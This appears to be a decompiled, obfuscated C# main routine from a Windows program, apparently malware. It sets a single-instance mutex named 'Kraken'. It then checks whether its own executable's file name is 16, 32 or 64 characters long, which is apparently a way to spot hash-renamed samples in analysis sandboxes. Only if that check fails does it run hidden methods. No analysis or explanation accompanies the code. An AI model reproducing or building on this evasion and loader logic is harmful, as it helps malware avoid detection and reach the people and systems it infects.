using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns1;
using ns4;

namespace ns0;

internal static class Class13
{
	[STAThread]
	private unsafe static void Main()
	{
		void* ptr = stackalloc byte[10];
		Class16.smethod_43();
		new Mutex(initiallyOwned: true, "Kraken", out *(bool*)((byte*)ptr + 8));
		if (((byte*)ptr)[8] == 0)
		{
			Environment.Exit(0);
		}
		((byte*)ptr)[9] = 0;
		int[] array = new int[3] { 16, 32, 64 };
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length)
		{
			*(int*)((byte*)ptr + 4) = array[*(int*)ptr];
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == *(int*)((byte*)ptr + 4))
			{
				((byte*)ptr)[9] = 1;
			}
			(*(int*)ptr)++;
		}
		if (Class16.smethod_92() && ((byte*)ptr)[9] == 0)
		{
			Class16.smethod_5(Class6.Class7.smethod_2(), Class6.Class7.smethod_4());
			Class16.smethod_69();
		}
		Class16.smethod_8(0);
	}
}
